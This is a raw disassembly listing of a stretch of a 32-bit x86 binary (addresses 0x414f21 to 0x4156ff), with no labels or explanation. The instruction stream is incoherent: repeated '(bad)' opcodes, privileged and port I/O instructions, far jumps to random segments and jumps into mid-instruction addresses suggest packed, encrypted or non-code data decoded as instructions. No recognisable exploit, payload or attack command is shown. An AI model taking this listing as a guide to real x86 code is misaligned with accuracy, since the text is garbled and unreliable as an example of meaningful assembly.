  414f21:	mov    esp,0xedf4790a
  414f26:	(bad)  
  414f27:	lea    ecx,[ebx]
  414f29:	fidiv  WORD PTR [esi-0x5c]
  414f2c:	jecxz  0x414eb8
  414f2e:	fidiv  DWORD PTR [bx+si+0x58]
  414f32:	xor    dh,BYTE PTR [esi]
  414f34:	pusha  
  414f35:	push   0x5f66e891
  414f3a:	xor    eax,0x202721c6
  414f3f:	jb     0x414fa3
  414f41:	xchg   DWORD PTR [esi-0x550e35d2],eax
  414f47:	pop    edi
  414f48:	xchg   esi,eax
  414f49:	xor    ch,al
  414f4b:	or     BYTE PTR [eax-0x27],dl
  414f4e:	push   ss
  414f4f:	stos   DWORD PTR es:[edi],eax
  414f50:	adc    DWORD PTR [edi+eiz*8+0x21],edi
  414f54:	pusha  
  414f55:	jp     0x414f55
  414f57:	mov    ebx,0x58fa4f91
  414f5c:	mov    bh,0xc4
  414f5e:	div    DWORD PTR [eax+0x59c1cfab]
  414f64:	or     DWORD PTR [edi+0xc],0xffffffd0
  414f68:	out    dx,eax
  414f69:	mov    ebx,0x4691a676
  414f6e:	ins    BYTE PTR es:[edi],dx
  414f6f:	mov    esi,0x3edefdbd
  414f74:	test   al,0x95
  414f76:	sbb    ebp,DWORD PTR [ebp+0x1d]
  414f79:	xor    eax,0xd6a1ebed
  414f7e:	sti    
  414f7f:	aam    0x34
  414f81:	mov    esp,0xd7eb0428
  414f86:	sbb    ebx,DWORD PTR [edi+0x25]
  414f89:	push   esp
  414f8a:	jne    0x414f78
  414f8c:	rcr    DWORD PTR [edi-0x13],0xb5
  414f90:	mov    DWORD PTR [ebx-0x1750b8c1],ecx
  414f96:	inc    edx
  414f97:	jo     0x414f53
  414f99:	sub    eax,0xd5169472
  414f9e:	(bad)  
  414f9f:	sub    eax,0x9700b31c
  414fa4:	and    esi,DWORD PTR [ebx+ebp*1]
  414fa7:	mov    ds:0x10fce81b,al
  414fac:	movsx  edi,WORD PTR [ecx-0x23]
  414fb0:	dec    eax
  414fb1:	in     eax,dx
  414fb2:	out    dx,eax
  414fb3:	je     0x414faf
  414fb5:	sbb    eax,0xa9e3d759
  414fba:	scas   eax,DWORD PTR es:[edi]
  414fbb:	mov    dl,0xa0
  414fbd:	sub    DWORD PTR [edi-0x9],esp
  414fc0:	jecxz  0x414f95
  414fc2:	lods   al,BYTE PTR ds:[esi]
  414fc3:	add    al,0x1d
  414fc5:	mov    ds:0x608829fb,eax
  414fca:	sbb    al,0xa0
  414fcc:	adc    BYTE PTR [ecx+0x2f],bl
  414fcf:	(bad)  
  414fd0:	ror    DWORD PTR [esi+0x5f],1
  414fd3:	ja     0x414fca
  414fd5:	clc    
  414fd6:	adc    BYTE PTR [edi-0x10],cl
  414fd9:	pop    ds
  414fda:	dec    ebp
  414fdb:	sub    BYTE PTR [edi-0xe03ee10],dh
  414fe1:	sub    eax,0x5807b728
  414fe6:	dec    esp
  414fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fe8:	push   0xffffffeb
  414fea:	stos   BYTE PTR es:[edi],al
  414feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fec:	cmc    
  414fed:	sub    DWORD PTR es:[edx],esp
  414ff0:	push   eax
  414ff1:	and    bh,BYTE PTR [edi+edi*2-0x62]
  414ff5:	cmp    ch,BYTE PTR [ecx-0x14]
  414ff8:	imul   eax,DWORD PTR [ebp+edx*8+0x54f1a9e1],0x1a
  415000:	push   ds
  415001:	das    
  415002:	xchg   edi,eax
  415003:	inc    ebp
  415004:	jmp    0x5228:0x2f80e3d1
  41500b:	pop    ecx
  41500c:	(bad)  
  41500e:	mov    eax,ds:0x146c95ee
  415013:	adc    al,0xa
  415015:	ins    BYTE PTR es:[edi],dx
  415016:	or     DWORD PTR [edi-0x22],ebp
  415019:	and    ebp,DWORD PTR [ebx]
  41501b:	dec    esp
  41501c:	adc    DWORD PTR [ecx+eax*8],eax
  41501f:	adc    DWORD PTR [esi-0x66],0xbc390c73
  415026:	idiv   BYTE PTR [ebp+0x5a]
  415029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41502a:	call   FWORD PTR ds:[eax+0x4c856517]
  415031:	xor    eax,0xf46894f3
  415036:	xchg   BYTE PTR [ecx-0x56a016c4],ch
  41503c:	leave  
  41503d:	mov    ds:0xaccd0fe2,eax
  415042:	div    DWORD PTR [eax-0x60398898]
  415048:	push   0xfffffff9
  41504a:	aad    0x47
  41504c:	mov    bl,0x3
  41504e:	outs   dx,DWORD PTR ds:[esi]
  41504f:	mov    ds:0xd8fdf9,al
  415054:	lods   al,BYTE PTR ds:[esi]
  415055:	add    esi,DWORD PTR [esi-0x34462bcd]
  41505b:	xchg   esi,eax
  41505c:	mov    ebx,0x68f22c39
  415061:	leave  
  415062:	dec    esp
  415063:	push   0xefac678d
  415068:	mov    al,ds:0x78851d1c
  41506d:	clc    
  41506e:	inc    edx
  41506f:	call   FWORD PTR [ebx]
  415071:	xchg   ecx,eax
  415072:	es dec edi
  415074:	push   0xffffffec
  415076:	cmp    eax,0x54ba4064
  41507b:	pusha  
  41507c:	clc    
  41507d:	or     DWORD PTR [ebx+0x70451e13],0x7a
  415084:	xor    al,BYTE PTR [eax]
  415086:	retf   
  415087:	loopne 0x41504e
  415089:	and    dh,BYTE PTR [edx-0x51]
  41508c:	xor    ah,BYTE PTR [ecx]
  41508e:	jns    0x41502d
  415090:	sahf   
  415091:	pusha  
  415092:	adc    bh,ah
  415094:	(bad)  
  415095:	fadd   st(7),st
  415097:	xchg   esp,edi
  415099:	icebp  
  41509a:	xor    eax,0x423a6184
  41509f:	fisttp QWORD PTR [edx+edi*4+0x5e4a34c]
  4150a6:	test   DWORD PTR [edi+0x50],ebx
  4150a9:	les    eax,FWORD PTR [si]
  4150ac:	push   ebx
  4150ad:	and    dl,BYTE PTR [ebp-0x70552976]
  4150b3:	mov    esi,0x53ad8d44
  4150b8:	push   es
  4150b9:	iret   
  4150ba:	xchg   edi,ebx
  4150bc:	sbb    al,0x6
  4150be:	fwait
  4150bf:	sbb    esp,DWORD PTR [ecx-0x1948f37c]
  4150c5:	inc    ebx
  4150c6:	adc    DWORD PTR [ebx],0x187f63f
  4150cc:	lods   eax,DWORD PTR ds:[esi]
  4150cd:	push   ds
  4150ce:	call   0xad6ecb13
  4150d3:	nop
  4150d4:	mov    esp,0xb50dc388
  4150d9:	push   0x51d96aa9
  4150de:	cld    
  4150df:	add    eax,0x723c70a0
  4150e4:	push   0xcc76e034
  4150e9:	stos   DWORD PTR es:[edi],eax
  4150ea:	xchg   ebx,eax
  4150eb:	hlt    
  4150ec:	cwde   
  4150ed:	mov    dh,0x1d
  4150ef:	cld    
  4150f0:	jmp    0x4150a7
  4150f2:	mov    ds:0x3006ba19,eax
  4150f7:	js     0x4150dc
  4150f9:	pop    esp
  4150fa:	xchg   ecx,eax
  4150fb:	sti    
  4150fc:	push   cs
  4150fd:	aas    
  4150fe:	and    cl,cl
  415100:	mov    cl,0x9a
  415102:	mov    edi,0x6edd79da
  415107:	in     eax,dx
  415108:	xchg   ebx,eax
  415109:	loopne 0x415145
  41510b:	cdq    
  41510c:	jb     0x41517a
  41510e:	cmp    BYTE PTR [esp+ebx*1+0x3a],cl
  415112:	fiadd  DWORD PTR [esi+0x1c]
  415115:	pusha  
  415116:	mov    cl,0x72
  415118:	scas   al,BYTE PTR es:[edi]
  415119:	in     al,0xba
  41511b:	xor    DWORD PTR [ebp+0x6a],edx
  41511e:	push   ds
  41511f:	invd   
  415121:	sub    dl,cl
  415123:	cmp    edx,DWORD PTR ss:[eax+0x7d]
  415127:	out    dx,al
  415128:	adc    al,0xf6
  41512a:	mov    cl,0x50
  41512c:	jne    0x41517c
  41512e:	xor    eax,0xb066e0b3
  415133:	lods   eax,DWORD PTR ds:[esi]
  415134:	add    ebx,edx
  415136:	cli    
  415137:	lock pop esp
  415139:	dec    DWORD PTR [ebx]
  41513b:	mov    fs,ebx
  41513d:	sub    al,0xe6
  41513f:	or     al,0xd3
  415141:	adc    BYTE PTR [ebp-0x53],0x3c
  415145:	adc    al,0x39
  415147:	lods   eax,DWORD PTR ds:[esi]
  415148:	(bad)  
  415149:	retf   
  41514a:	pop    es
  41514b:	xor    esi,0xffffffd4
  41514e:	test   eax,0x53d8d5b0
  415153:	popf   
  415154:	and    eax,esi
  415156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415157:	loope  0x41515f
  415159:	or     eax,0xece77683
  41515e:	and    ecx,ebp
  415160:	es pop ss
  415162:	sub    al,0x34
  415164:	scas   al,BYTE PTR es:[edi]
  415165:	clc    
  415166:	mov    BYTE PTR [esi-0x7dc9fbd0],ch
  41516c:	pop    esi
  41516d:	addr16 jns 0x41514f
  415170:	xor    BYTE PTR [esi],0x1d
  415173:	ror    DWORD PTR [edx],cl
  415175:	adc    ecx,eax
  415177:	test   al,0x9a
  415179:	dec    ecx
  41517a:	cmp    DWORD PTR [edx],esi
  41517c:	ret    0x4e9d
  41517f:	mov    ah,0x7
  415181:	in     al,0x5e
  415183:	mov    eax,ds:0xa235e423
  415188:	test   eax,0x7f475aee
  41518d:	cmp    DWORD PTR [eax],edi
  41518f:	and    bl,dl
  415191:	in     eax,dx
  415192:	or     cl,dh
  415194:	in     eax,0x6
  415196:	sbb    BYTE PTR [ebx],dh
  415198:	loope  0x4151f8
  41519a:	sbb    eax,0xf9bf1f85
  41519f:	mov    ecx,0x2a4b669f
  4151a4:	inc    ecx
  4151a5:	and    BYTE PTR [ecx+0x54],dh
  4151a8:	push   ds
  4151a9:	mov    ecx,0x79493616
  4151ae:	or     DWORD PTR [edi-0x55269f36],0x4fb5d78f
  4151b8:	mov    edi,0x36d85e06
  4151bd:	fnstenv [edx]
  4151bf:	aad    0x92
  4151c1:	xor    dh,ah
  4151c3:	test   eax,0xefd82d55
  4151c8:	shl    BYTE PTR [ebx+ecx*2],1
  4151cb:	push   eax
  4151cc:	(bad)  
  4151cd:	push   edx
  4151ce:	push   ds
  4151cf:	xchg   esi,eax
  4151d0:	add    al,0xda
  4151d2:	jne    0x41516c
  4151d4:	push   0x9
  4151d6:	adc    al,0x9c
  4151d8:	les    ebx,FWORD PTR [edi-0x50]
  4151db:	xchg   DWORD PTR [ecx+0x44e5098c],esi
  4151e1:	icebp  
  4151e2:	aam    0xff
  4151e4:	push   dx
  4151e6:	mov    ds:0xc9ad8a01,al
  4151eb:	les    ebp,FWORD PTR [eax-0x27b22d6c]
  4151f1:	iret   
  4151f2:	(bad)  
  4151f3:	test   al,0x44
  4151f5:	mov    eax,0x91fddfa5
  4151fa:	xchg   esi,eax
  4151fb:	mov    BYTE PTR [edx+0xec3118f],bl
  415201:	sahf   
  415202:	xor    cl,bl
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	aas    
  415207:	adc    ebp,DWORD PTR [ebx+edx*4-0x1d]
  41520b:	dec    eax
  41520c:	mov    al,ds:0x479f2a77
  415211:	or     DWORD PTR [edi+0x48bd39d2],eax
  415217:	test   eax,0x2bdf868
  41521c:	sub    al,0x7d
  41521e:	inc    eax
  41521f:	sub    dl,ah
  415221:	sbb    edi,eax
  415223:	ret    0xeafc
  415226:	test   al,0x50
  415228:	mov    dl,0x38
  41522a:	dec    ebp
  41522b:	sbb    BYTE PTR [eax+0x7d],dh
  41522e:	cmp    al,0xfe
  415230:	in     eax,0xb3
  415232:	div    DWORD PTR [edi]
  415234:	fisub  WORD PTR [esi-0x33]
  415237:	and    ch,bh
  415239:	inc    esp
  41523a:	popa   
  41523b:	xor    esi,DWORD PTR [eax-0x57]
  41523e:	gs stc 
  415240:	xor    DWORD PTR [eax+0x29],eax
  415243:	or     al,0xa9
  415245:	out    dx,eax
  415246:	test   eax,0x96ad8fcb
  41524b:	das    
  41524c:	push   eax
  41524d:	inc    eax
  41524e:	shr    BYTE PTR [esi-0xd],0x2a
  415252:	xor    dl,BYTE PTR cs:[edi]
  415255:	cli    
  415256:	pop    ecx
  415257:	stos   BYTE PTR es:[edi],al
  415258:	cmp    bl,BYTE PTR [edx-0x24]
  41525b:	xor    DWORD PTR [edi+0x1c13bee8],esi
  415261:	fild   DWORD PTR [esi+0x54946370]
  415267:	mov    al,ds:0x84a22cde
  41526c:	and    eax,0x370de8ab
  415271:	adc    al,0xbc
  415273:	jg     0x4151f9
  415275:	and    bl,BYTE PTR [eax+0x43]
  415278:	lea    ecx,[ebp+0x52f56d46]
  41527e:	sbb    al,0xdf
  415280:	sar    bl,1
  415282:	push   ebp
  415283:	jae    0x415211
  415285:	(bad)  
  415287:	sbb    DWORD PTR [eax],eax
  415289:	(bad)  [ecx-0x56]
  41528c:	in     eax,0x99
  41528e:	or     dl,bh
  415290:	ss mov edi,0xdf67c90a
  415296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415297:	sub    edx,DWORD PTR [edx-0x78]
  41529a:	scas   eax,DWORD PTR es:[edi]
  41529b:	pop    ebp
  41529c:	jns    0x415226
  41529e:	clc    
  41529f:	ins    BYTE PTR es:[edi],dx
  4152a0:	addr16 xchg ecx,eax
  4152a2:	pushf  
  4152a3:	rol    BYTE PTR [edi+eiz*1+0x170c507b],cl
  4152aa:	push   edx
  4152ab:	ds mov ecx,0x6d130b58
  4152b1:	sbb    ecx,ebp
  4152b3:	mov    esp,0xd67f42b8
  4152b8:	sbb    esi,edi
  4152ba:	popf   
  4152bb:	and    dl,BYTE PTR [ebx-0x3d2ebb2d]
  4152c1:	xchg   edi,eax
  4152c2:	sub    BYTE PTR [edi-0x34],ch
  4152c5:	xchg   edx,eax
  4152c6:	and    esp,eax
  4152c8:	xor    DWORD PTR [eax-0x49],ecx
  4152cb:	or     eax,0x2ac55ea
  4152d0:	jns    0x415316
  4152d2:	and    al,BYTE PTR [esi-0x6cbbdea5]
  4152d8:	pop    ebx
  4152d9:	inc    esi
  4152da:	push   0x83ef5a27
  4152df:	dec    ebp
  4152e0:	sub    BYTE PTR [esi],ah
  4152e2:	or     eax,DWORD PTR [eax+eax*4+0xf]
  4152e6:	scas   al,BYTE PTR es:[edi]
  4152e7:	add    eax,0x6d2cef49
  4152ec:	xchg   esp,eax
  4152ed:	cmp    BYTE PTR [eax-0x3b],0x4b
  4152f1:	adc    dl,BYTE PTR [ecx-0x41]
  4152f4:	push   ds
  4152f5:	sbb    edx,ebx
  4152f7:	xchg   edi,eax
  4152f8:	xchg   BYTE PTR [edi+edx*8+0x50],ah
  4152fc:	xchg   ecx,eax
  4152fd:	arpl   di,di
  4152ff:	push   edx
  415300:	popf   
  415301:	cmp    cl,BYTE PTR [ebx+0x29968d39]
  415307:	cli    
  415308:	jns    0x4152a2
  41530a:	jl     0x41528d
  41530c:	test   BYTE PTR [eax-0x71772162],bh
  415312:	or     eax,0x6eb001dc
  415317:	daa    
  415318:	outs   dx,BYTE PTR ds:[esi]
  415319:	xchg   esi,eax
  41531a:	jmp    0x8b87:0x60a0f665
  415321:	das    
  415322:	push   ecx
  415323:	pop    edi
  415324:	dec    esi
  415325:	sub    BYTE PTR [ebp-0x35],0x51
  415329:	sti    
  41532a:	xor    BYTE PTR [ecx-0x3a],dl
  41532d:	add    esi,DWORD PTR [ebp+0x50]
  415330:	push   edx
  415331:	imul   eax
  415333:	sbb    BYTE PTR [esi-0x2a],dh
  415336:	mov    ch,0xfc
  415338:	jmp    0x2b94ab2b
  41533d:	jp     0x4153aa
  41533f:	xlat   BYTE PTR ds:[ebx]
  415340:	leave  
  415341:	and    BYTE PTR [edx-0x6a67be2e],cl
  415347:	jb     0x4153b4
  415349:	cmp    bh,BYTE PTR [edx+0x45fb7b54]
  41534f:	jnp    0x4152df
  415351:	neg    DWORD PTR [ebx+0x70]
  415354:	mov    ah,0x38
  415356:	jp     0x41539f
  415358:	pop    ebx
  415359:	mov    bh,0x84
  41535b:	pop    ebx
  41535c:	test   eax,0xe29becf3
  415361:	cmp    al,0x65
  415363:	nop
  415364:	sahf   
  415365:	(bad)  
  415366:	leave  
  415367:	add    ecx,DWORD PTR [ecx-0x55255b26]
  41536d:	ret    0x7589
  415370:	sub    BYTE PTR [ecx+0x120a3e91],ch
  415376:	imul   ebx,DWORD PTR [edi],0xe77a53f5
  41537c:	sbb    al,0xcb
  41537e:	das    
  41537f:	xchg   BYTE PTR [edi+0x5a],ch
  415382:	xor    al,0x72
  415384:	mul    DWORD PTR [ebp+0x61]
  415387:	cli    
  415388:	ret    0x476d
  41538b:	mov    eax,0x3accefad
  415390:	pop    esi
  415391:	xchg   esi,eax
  415392:	cdq    
  415393:	mov    dh,0x25
  415395:	fidiv  DWORD PTR [esi-0x21122c6e]
  41539b:	clc    
  41539c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41539d:	loopne 0x41533c
  41539f:	push   esp
  4153a0:	cmp    ah,BYTE PTR [ebp+0x2bb2a712]
  4153a6:	mov    ah,0xc
  4153a8:	ins    DWORD PTR es:[edi],dx
  4153a9:	mov    ebp,0xea42b29b
  4153ae:	push   ecx
  4153af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b0:	inc    edx
  4153b1:	rcl    DWORD PTR [ebp-0x6c99c53d],cl
  4153b7:	cmp    al,0x68
  4153b9:	xchg   ecx,eax
  4153ba:	dec    DWORD PTR [edi+ecx*8]
  4153bd:	ja     0x4153f5
  4153bf:	sbb    BYTE PTR [ecx+0x11],bl
  4153c2:	aas    
  4153c3:	add    cl,BYTE PTR [esp+edi*2-0x935672a]
  4153ca:	nop    DWORD PTR [ecx]
  4153cd:	sub    ecx,edi
  4153cf:	pop    eax
  4153d0:	lds    edi,FWORD PTR ds:0xae9d6567
  4153d6:	pop    ss
  4153d7:	ja     0x415375
  4153d9:	push   edi
  4153da:	test   BYTE PTR [ecx],dl
  4153dc:	(bad)  
  4153dd:	(bad)  
  4153de:	cmc    
  4153df:	into   
  4153e0:	test   eax,0x636a560d
  4153e5:	pop    edx
  4153e6:	leave  
  4153e7:	inc    ecx
  4153e8:	rol    DWORD PTR cs:[esi],0xf4
  4153ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ed:	or     esi,eax
  4153ef:	adc    eax,0x52e6be
  4153f4:	sar    BYTE PTR [bx+si],0x6d
  4153f8:	and    esp,DWORD PTR [ecx]
  4153fa:	mov    ch,0x4a
  4153fc:	je     0x415382
  4153fe:	jmp    0x415431
  415400:	xlat   BYTE PTR ds:[ebx]
  415401:	icebp  
  415402:	mov    dl,0xc
  415404:	test   al,0xb7
  415406:	ins    DWORD PTR es:[edi],dx
  415407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415408:	inc    esp
  415409:	cwde   
  41540a:	icebp  
  41540b:	add    bh,BYTE PTR [ebp+0x59]
  41540e:	adc    ch,bl
  415410:	into   
  415411:	jnp    0x4153c4
  415413:	dec    esp
  415414:	fistp  WORD PTR [ebx+ebx*8-0x233b8228]
  41541b:	out    dx,eax
  41541c:	out    0x4,eax
  41541e:	push   0x9cbf87b2
  415423:	fcom   QWORD PTR [ebx+0x276d4b]
  415429:	dec    edx
  41542a:	js     0x4153f5
  41542c:	cmp    al,0x24
  41542e:	sub    eax,0x61355b3d
  415433:	stos   BYTE PTR es:[edi],al
  415434:	adc    cl,BYTE PTR [ebx-0x32]
  415437:	cmp    bh,BYTE PTR [edx-0x6]
  41543a:	xor    BYTE PTR [ebx],cl
  41543c:	sub    eax,0xe2e3a556
  415441:	or     al,0x4a
  415443:	dec    eax
  415444:	mov    ah,0x87
  415446:	mov    DWORD PTR gs:[edi],edi
  415449:	or     cl,BYTE PTR ds:0xe6b13f01
  41544f:	lods   al,BYTE PTR ds:[esi]
  415450:	push   ebx
  415451:	dec    edx
  415452:	mov    edi,0xd13db223
  415457:	fld    QWORD PTR [edi-0x62]
  41545a:	jmp    0xf470:0x25a2ada1
  415461:	push   0x486cad2
  415466:	aam    0x2f
  415468:	cmp    BYTE PTR [esi+ebp*2],al
  41546b:	scas   al,BYTE PTR es:[edi]
  41546c:	pusha  
  41546d:	dec    edx
  41546e:	ret    
  41546f:	mov    eax,ds:0x29e062a9
  415474:	int    0x46
  415476:	fdiv   st(0),st
  415478:	sub    eax,0xa50ee218
  41547d:	daa    
  41547e:	mov    esi,0xde3e4616
  415483:	test   BYTE PTR [ebx],al
  415485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415486:	dec    edi
  415487:	push   edi
  415488:	mov    ds:0x501c486d,eax
  41548d:	std    
  41548e:	fidiv  WORD PTR ds:0x2a70417c
  415494:	mov    dh,0xaa
  415496:	pop    ebp
  415497:	or     edx,ebx
  415499:	inc    ebp
  41549a:	int3   
  41549b:	dec    esi
  41549c:	in     eax,dx
  41549d:	ds in  eax,0xde
  4154a0:	pop    edx
  4154a1:	sbb    cl,bl
  4154a3:	and    ebp,edx
  4154a5:	ret    0xcc4e
  4154a8:	mov    bl,0x5e
  4154aa:	adc    bh,BYTE PTR [esi+0x5902bf01]
  4154b0:	sub    eax,0x6971d5b5
  4154b5:	push   ebp
  4154b6:	and    BYTE PTR [ebp-0x4d237fee],bh
  4154bc:	stc    
  4154bd:	pop    cx
  4154bf:	or     DWORD PTR [eax],0x1ddbe1a6
  4154c5:	inc    ah
  4154c7:	lods   eax,DWORD PTR ds:[esi]
  4154c8:	pop    ecx
  4154c9:	cmc    
  4154ca:	(bad)
  4154cd:	and    edx,DWORD PTR [ebx]
  4154cf:	mov    ebx,0x4266570b
  4154d4:	add    al,0x16
  4154d6:	int3   
  4154d7:	dec    ebp
  4154d8:	vpsubq ymm3,ymm1,YMMWORD PTR [esi-0x68]
  4154dd:	ret    0xa833
  4154e0:	mov    bl,0xbf
  4154e2:	popf   
  4154e3:	js     0x41553a
  4154e5:	adc    ebx,ecx
  4154e7:	mov    esp,0x70f72b39
  4154ec:	popa   
  4154ed:	cli    
  4154ee:	(bad)  
  4154ef:	rcl    cl,1
  4154f1:	jp     0x4154f6
  4154f3:	ror    BYTE PTR [edx-0x7c],cl
  4154f6:	jg     0x4154ab
  4154f8:	rol    DWORD PTR [eax+0x50],1
  4154fb:	push   ecx
  4154fc:	retf   
  4154fd:	mov    eax,0xb475c6b6
  415502:	or     eax,0x1f9884d0
  415507:	js     0x415556
  415509:	cmp    ebp,0xb
  41550c:	pushf  
  41550d:	lahf   
  41550e:	pop    esi
  41550f:	mov    bl,0x2a
  415511:	aas    
  415512:	iret   
  415513:	in     al,dx
  415514:	sub    al,0xd1
  415516:	jns    0x41556c
  415518:	mov    al,0x2a
  41551a:	lods   eax,DWORD PTR ds:[esi]
  41551b:	in     eax,0xf6
  41551d:	mov    bl,0x81
  41551f:	and    BYTE PTR [ecx+0x76ff8ddb],ah
  415525:	test   DWORD PTR [ebx-0x11f93c68],ecx
  41552b:	(bad)  
  41552d:	(bad)  
  41552e:	out    0x66,eax
  415530:	push   ebp
  415531:	and    al,0xae
  415533:	loope  0x415599
  415535:	gs retf 
  415537:	and    eax,DWORD PTR [edx-0x32f36239]
  41553d:	cmp    ax,0xbe28
  415541:	mov    ebx,0x3dcd9311
  415546:	fimul  WORD PTR [esp+edi*4-0x6c9e189c]
  41554d:	sar    edx,cl
  41554f:	adc    DWORD PTR [edi+0x761a6c82],0x42
  415556:	or     BYTE PTR [edi+0x28],bl
  415559:	data16 cmp ch,BYTE PTR [ebx-0x7]
  41555d:	add    eax,0xeedc5c6c
  415562:	(bad)  
  415563:	ins    BYTE PTR es:[edi],dx
  415564:	mov    al,ds:0xff54bba0
  415569:	adc    al,0xd4
  41556b:	mov    dl,0x84
  41556d:	jo     0x41550f
  41556f:	and    ah,BYTE PTR [ecx+0x1]
  415572:	inc    ebx
  415573:	pop    ebp
  415574:	xchg   BYTE PTR [ebx+0x197dc963],dh
  41557a:	bound  esp,QWORD PTR [edi-0x5cd5a0b4]
  415580:	xchg   ebx,eax
  415581:	mov    bp,0xc668
  415585:	das    
  415586:	fbld   TBYTE PTR [ecx+esi*1+0x60]
  41558a:	out    dx,al
  41558b:	sub    bh,BYTE PTR [ecx+0x64]
  41558e:	xchg   BYTE PTR [eax+0x429f59c1],cl
  415594:	dec    ecx
  415595:	out    dx,al
  415596:	push   eax
  415597:	ins    DWORD PTR es:[edi],dx
  415598:	bound  esi,QWORD PTR [ebx]
  41559a:	lds    ecx,FWORD PTR [edi+0x4b988817]
  4155a0:	and    eax,0x3c69db2f
  4155a5:	je     0x4155b7
  4155a7:	lods   eax,DWORD PTR ds:[esi]
  4155a8:	pop    ss
  4155a9:	shl    BYTE PTR [esi+ecx*4+0x62],cl
  4155ad:	sbb    eax,0x63c69719
  4155b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155b3:	inc    esi
  4155b4:	push   0x69
  4155b6:	jb     0x41554d
  4155b8:	sub    ch,BYTE PTR [ebp+ebp*8+0x10efd350]
  4155bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c0:	repz push ecx
  4155c2:	mov    ebp,fs
  4155c4:	xor    DWORD PTR [eax+esi*2+0x216acbee],ecx
  4155cb:	leave  
  4155cc:	(bad)  
  4155ce:	inc    ebx
  4155cf:	cmc    
  4155d0:	mov    bh,0x1e
  4155d2:	out    dx,al
  4155d3:	pusha  
  4155d4:	and    bl,ah
  4155d6:	js     0x41556a
  4155d8:	ror    BYTE PTR ds:[edi+edi*4],0x58
  4155dd:	or     eax,0xf5c2f250
  4155e2:	mov    dh,ah
  4155e4:	adc    BYTE PTR [eax+0x765fb88d],ch
  4155ea:	icebp  
  4155eb:	popa   
  4155ec:	iret   
  4155ed:	mov    DWORD PTR [eax-0x7a],0x4b933da7
  4155f4:	pop    edx
  4155f5:	xlat   BYTE PTR ds:[ebx]
  4155f6:	imul   edi,DWORD PTR [edi-0x7a],0xf1aa6ff1
  4155fd:	lods   eax,DWORD PTR ds:[esi]
  4155fe:	rcl    ah,0x45
  415601:	xchg   edi,eax
  415602:	ja     0x415640
  415604:	cmp    eax,DWORD PTR ds:0x7791d5ca
  41560a:	pusha  
  41560b:	cld    
  41560c:	add    ecx,DWORD PTR [ecx]
  41560e:	or     edx,ebp
  415610:	ins    DWORD PTR es:[edi],dx
  415611:	jb     0x415661
  415613:	pop    ds
  415614:	fwait
  415615:	pop    ebp
  415616:	mov    eax,ds:0x190842f4
  41561b:	(bad)  
  41561d:	add    BYTE PTR [ebx+0x1],dh
  415620:	test   al,0x57
  415622:	dec    esp
  415623:	add    al,BYTE PTR [ebx+edi*2-0x73]
  415627:	pusha  
  415628:	test   al,0xb2
  41562a:	push   ds
  41562b:	imul   ebp,DWORD PTR [esi-0x33410d5e],0x431a7cc6
  415635:	int    0x49
  415637:	or     eax,0x469da865
  41563c:	xor    eax,0xc2341f6e
  415641:	pop    ss
  415642:	push   cs
  415643:	pop    ds
  415644:	into   
  415645:	in     al,0x33
  415647:	lods   ax,WORD PTR ds:[esi]
  415649:	xor    BYTE PTR [eax-0x73],cl
  41564c:	dec    esi
  41564d:	(bad)  
  41564e:	(bad)  
  415650:	scas   al,BYTE PTR es:[edi]
  415651:	pop    ecx
  415652:	nop
  415653:	adc    BYTE PTR [esi+0x70d53616],dh
  415659:	cmp    al,0xb3
  41565b:	xchg   edx,eax
  41565c:	icebp  
  41565d:	call   0xf24c201f
  415662:	or     al,0xc3
  415664:	or     edi,DWORD PTR [ecx+0x56]
  415667:	xor    eax,DWORD PTR ds:0xda69f162
  41566d:	mov    BYTE PTR [ebp+0x2a],0x94
  415671:	mov    esi,0x322f812f
  415676:	push   ecx
  415677:	sub    BYTE PTR [eax+0x5b],dl
  41567a:	stc    
  41567b:	lods   eax,DWORD PTR ds:[esi]
  41567c:	sub    ebx,DWORD PTR [ebp+0x2d5ab7bb]
  415682:	cwde   
  415683:	cwde   
  415684:	je     0x4156c1
  415686:	(bad)  
  415688:	adc    ebx,DWORD PTR [edi-0x14d7d486]
  41568e:	jl     0x41561e
  415690:	outs   dx,DWORD PTR ds:[esi]
  415691:	pop    esi
  415692:	dec    ebx
  415693:	scas   al,BYTE PTR es:[edi]
  415694:	push   ebx
  415695:	jo     0x415662
  415697:	push   esi
  415698:	ins    BYTE PTR es:[edi],dx
  415699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569a:	enter  0x55a9,0xf9
  41569e:	call   0xdccb7f7
  4156a3:	mov    cs,ebp
  4156a5:	dec    ecx
  4156a6:	lahf   
  4156a7:	pushf  
  4156a8:	xchg   ecx,eax
  4156a9:	mov    esp,DWORD PTR [esp+eiz*2]
  4156ac:	push   esi
  4156ad:	cs pop edi
  4156af:	inc    esp
  4156b0:	jge    0x4156d5
  4156b2:	popf   
  4156b3:	and    BYTE PTR [ebx+ebp*1-0x5af7c599],bl
  4156ba:	and    BYTE PTR [ebx+0x2b],0xb3
  4156be:	xchg   DWORD PTR [edi+0x5821c1a1],ebx
  4156c4:	pop    ebp
  4156c5:	ficomp DWORD PTR [edi+0x1b04c368]
  4156cb:	jmp    FWORD PTR [esi-0x8228f2]
  4156d1:	mov    edx,0x8df49bfd
  4156d6:	(bad)  
  4156d7:	in     al,0x99
  4156d9:	dec    ecx
  4156da:	jnp    0x4156b0
  4156dc:	cmp    esp,DWORD PTR [ebx]
  4156de:	add    eax,0x3e97be7
  4156e3:	jns    0x4156af
  4156e5:	fst    st(7)
  4156e7:	mov    BYTE PTR [eax],cl
  4156e9:	push   eax
  4156ea:	js     0x41573f
  4156ec:	mov    ds:0xe81af313,al
  4156f1:	loop   0x4156f8
  4156f3:	xchg   ebp,eax
  4156f4:	sar    BYTE PTR [edx-0x270b8c08],cl
  4156fa:	xor    eax,0x110fde7e
  4156ff:	adc    eax,DWORD PTR [edx+0x5ea0b781]
